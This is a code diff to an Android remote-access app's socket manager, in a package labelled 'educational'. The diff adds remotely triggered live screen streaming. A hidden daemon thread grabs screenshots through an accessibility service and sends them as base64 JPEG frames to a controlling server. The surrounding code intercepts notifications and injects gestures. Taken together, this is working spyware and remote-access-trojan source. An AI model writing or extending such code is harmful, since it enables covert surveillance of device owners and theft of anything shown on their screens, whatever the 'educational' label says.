@@ -1,7 +1,9 @@
 package com.remoteaccess.educational.network;
 
 import android.content.Context;
+import android.graphics.Bitmap;
 import android.os.Build;
+import android.util.Base64;
 import android.util.Log;
 import com.remoteaccess.educational.advanced.NotificationInterceptor;
 import com.remoteaccess.educational.commands.*;
@@ -11,6 +13,7 @@ import com.remoteaccess.educational.utils.DeviceInfo;
 import org.json.JSONException;
 import org.json.JSONObject;
 import java.io.BufferedReader;
+import java.io.ByteArrayOutputStream;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.Socket;
@@ -43,6 +46,11 @@ public class SocketManager {
     private final ExecutorService          executor          = Executors.newCachedThreadPool();
     private final ScheduledExecutorService heartbeatExecutor = Executors.newSingleThreadScheduledExecutor();
     private ScheduledFuture<?>             heartbeatFuture;
+
+    // Streaming state
+    private volatile boolean streaming  = false;
+    private volatile int     streamFps  = 2;
+    private Thread           streamThread;
 
     // Command Handlers — one instance each, created once and reused
     private final CommandExecutor   commandExecutor;
@@ -412,6 +420,23 @@ public class SocketManager {
         if (command.equals("get_notifications_from_app")) return NotificationInterceptor.getNotificationsFromApp(params.getString("packageName"));
         if (command.equals("clear_notifications"))        return NotificationInterceptor.clearAllNotifications();
 
+        // ── Streaming ────────────────────────────────────────────────────
+        if (command.equals("stream_start")) {
+            int fps = params.optInt("fps", 2);
+            startStreaming(fps, DeviceInfo.getDeviceId(context));
+            JSONObject r = new JSONObject();
+            r.put("success", true);
+            r.put("message", "Streaming started at " + fps + " fps");
+            return r;
+        }
+        if (command.equals("stream_stop")) {
+            stopStreaming();
+            JSONObject r = new JSONObject();
+            r.put("success", true);
+            r.put("message", "Streaming stopped");
+            return r;
+        }
+
         // ── Accessibility-required commands ──────────────────────────────
         // Screen Control (gestures) + Screen Reader
         if (isAccessibilityCommand(command)) {
@@ -423,6 +448,77 @@ public class SocketManager {
         unknown.put("success", false);
         unknown.put("error", "Unknown command: " + command);
         return unknown;
+    }
+
+    // ── Streaming ─────────────────────────────────────────────────────────
+
+    private void startStreaming(int fps, String deviceId) {
+        stopStreaming();
+        streaming  = true;
+        streamFps  = fps;
+        streamThread = new Thread(() -> {
+            long intervalMs = fps > 0 ? 1000L / fps : 500L;
+            Log.i(TAG, "Streaming started @ " + fps + "fps, interval=" + intervalMs + "ms");
+            while (streaming && connected) {
+                try {
+                    Bitmap frame = captureFrame();
+                    if (frame != null) {
+                        String b64 = bitmapToBase64(frame, 50);
+                        frame.recycle();
+                        if (b64 != null) {
+                            JSONObject d = new JSONObject();
+                            d.put("deviceId",  deviceId);
+                            d.put("frameData", b64);
+                            d.put("timestamp", System.currentTimeMillis());
+                            sendMessage("stream:frame", d);
+                        }
+                    }
+                    Thread.sleep(intervalMs);
+                } catch (InterruptedException e) {
+                    break;
+                } catch (Exception e) {
+                    Log.e(TAG, "Streaming frame error: " + e.getMessage());
+                    try { Thread.sleep(1000); } catch (InterruptedException ie) { break; }
+                }
+            }
+            Log.i(TAG, "Streaming thread ended");
+        });
+        streamThread.setName("stream-thread");
+        streamThread.setDaemon(true);
+        streamThread.start();
+    }
+
+    private void stopStreaming() {
+        streaming = false;
+        if (streamThread != null) {
+            streamThread.interrupt();
+            streamThread = null;
+        }
+    }
+
+    private Bitmap captureFrame() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
+            if (svc != null) return svc.captureScreenSync();
+        }
+        // Fallback: try screenshot handler
+        try {
+            return screenshotHandler.captureBitmap();
+        } catch (Exception e) {
+            Log.w(TAG, "captureFrame fallback failed: " + e.getMessage());
+            return null;
+        }
+    }
+
+    private String bitmapToBase64(Bitmap bitmap, int quality) {
+        try {
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, out);
+            return Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
+        } catch (Exception e) {
+            Log.e(TAG, "bitmapToBase64 error: " + e.getMessage());
+            return null;
+        }
     }
 
     private boolean isAccessibilityCommand(String command) {
